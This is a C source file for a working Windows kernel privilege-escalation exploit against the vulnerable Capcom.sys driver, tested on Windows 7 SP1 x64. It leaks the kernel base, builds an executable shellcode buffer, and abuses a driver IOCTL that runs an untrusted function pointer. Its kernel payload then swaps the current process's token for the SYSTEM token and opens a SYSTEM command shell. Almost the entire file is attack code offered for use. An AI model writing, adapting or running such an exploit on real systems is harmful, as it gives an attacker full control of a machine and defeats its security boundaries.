#include "exploit.h"

unsigned long long nt_base_address = 0;

// I will be completely honest, I out-right ripped the template from this video:
// https://www.youtube.com/watch?v=pJZjWXxUEl4
unsigned char input_buffer[24] =
{
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	// Pointer to the start of the input buffer
	0xE8, 0x08, 0x00, 0x00, 0x00,					// call [rip+0x8]
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	// Pointer to the kernel payload
	0x58,											// pop rax
	0xFF, 0x20										// jmp [rax]
};

int main(int argc, char** argv)
{
	HANDLE h_driver = CreateFileA(DEVICE_OBJECT, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0), h_thread = 0;
	void* input_pointer = 0;
	unsigned long returned_data = 0, bytes_returned = 0, old_protection = 0, thread_id = 0;
	unsigned char unused = 0;

	SetConsoleTitleA("CapRoot");

	printf("[*] Capcom.sys Untrusted Function Pointer Execution Elevation of Privilege Vulnerability\n[*] Tested successfully on Windows 7 Build 7601 SP1 x64\n[*] Exploit written by ExAllocatePool2\n[!] Let's exploit!");

	if (h_driver == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the vulnerable device driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the vulnerable device driver. Handle Value: 0x%p", h_driver);

	nt_base_address = leak_ntoskrnl_base_address();
	if (!nt_base_address)
	{
		return 1;
	}

	if (!VirtualProtect(&input_buffer, sizeof(input_buffer), PAGE_EXECUTE_READWRITE, &old_protection))
	{
		printf("\n[-] Failed to mark the input buffer as read+write+executable. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Marked the input buffer as read+write+executable. Old Protection: %d (0x%x), New Protection: %d (0x%x)", old_protection, old_protection, PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_READWRITE);

	*(unsigned long long*)input_buffer = (unsigned long long*)(input_buffer + 8);
	*(unsigned long long*)(input_buffer + 13) = &kernel_payload;
	input_pointer = (void*)(input_buffer + 8);
	printf("\n[+] Crafted the input buffer.\n<---------------- | Entering Danger Zone | ---------------->\n[!] Triggering execution of untrusted function code in 3...");

	Sleep(1000);
	for (int i = 2; i > 0; i--)
	{
		printf("\n[!] %d...", i);
		Sleep(1000);
	}

	DeviceIoControl(h_driver, TARGET_IOCTL_BRANCH, &input_pointer, 8, &returned_data, 4, &bytes_returned, 0);

	printf("\n[+] Triggered execution of untrusted function code.\n<---------------- | Leaving Danger Zone | ---------------->\n[+] Spawned a \"nt authority\\system\" shell.\n[+] Exploitation complete.");
	system("start C:\\Windows\\System32\\cmd.exe");
	unused = getchar();
	return 0;
}

NTSTATUS kernel_payload()
{
	// Initialization

	MmGetSystemRoutineAddress _MmGetSystemRoutineAddress = nt_base_address + MMGETSYSTEMROUTINEADDRESS_OFFSET_WIN7SP1X64;
	RtlInitUnicodeString _RtlInitUnicodeString = nt_base_address + RTLINITUNICODESTRING_OFFSET_WIN7SP1X64;

	UNICODE_STRING PsGetCurrentProcessId_string;
	UNICODE_STRING PsLookupProcessByProcessId_string;
	UNICODE_STRING PsReferencePrimaryToken_string;
	UNICODE_STRING PsDereferencePrimaryToken_string;
	UNICODE_STRING ObfDereferenceObject_string;

	_RtlInitUnicodeString(&PsGetCurrentProcessId_string, L"PsGetCurrentProcessId");
	_RtlInitUnicodeString(&PsLookupProcessByProcessId_string, L"PsLookupProcessByProcessId");
	_RtlInitUnicodeString(&PsReferencePrimaryToken_string, L"PsReferencePrimaryToken");
	_RtlInitUnicodeString(&PsDereferencePrimaryToken_string, L"PsDereferencePrimaryToken");
	_RtlInitUnicodeString(&ObfDereferenceObject_string, L"ObfDereferenceObject");

	PsGetCurrentProcessId _PsGetCurrentProcessId = _MmGetSystemRoutineAddress(&PsGetCurrentProcessId_string);
	PsLookupProcessByProcessId _PsLookupProcessByProcessId = _MmGetSystemRoutineAddress(&PsLookupProcessByProcessId_string);
	PsReferencePrimaryToken _PsReferencePrimaryToken = _MmGetSystemRoutineAddress(&PsReferencePrimaryToken_string);
	PsDereferencePrimaryToken _PsDereferencePrimaryToken = _MmGetSystemRoutineAddress(&PsDereferencePrimaryToken_string);
	ObfDereferenceObject _ObfDereferenceObject = _MmGetSystemRoutineAddress(&ObfDereferenceObject_string);

	// Payload

	PVOID current_process = 0, system_process = nt_base_address + PSINITIALSYSTEMPROCESS_OFFSET_WIN7SP1X64;

	_PsLookupProcessByProcessId(_PsGetCurrentProcessId(), &current_process);

	PACCESS_TOKEN current_token = _PsReferencePrimaryToken(current_process), system_token = _PsReferencePrimaryToken(system_process);
	ULONG_PTR* test_address = 0;
	PACCESS_TOKEN* token_address = 0, probable_token = 0;

	test_address = (ULONG_PTR*)((ULONG_PTR)(current_process)+(ULONG_PTR)EPROCESS_TOKEN_OFFSET_WIN7SP1X64);
	probable_token = (PACCESS_TOKEN)(*test_address & (ULONG_PTR)(-0xF));
	token_address = (PACCESS_TOKEN*)(test_address);
	*token_address = system_token;

	_PsDereferencePrimaryToken(current_token);
	_PsDereferencePrimaryToken(system_token);
	_ObfDereferenceObject(current_process);

	return 0;
}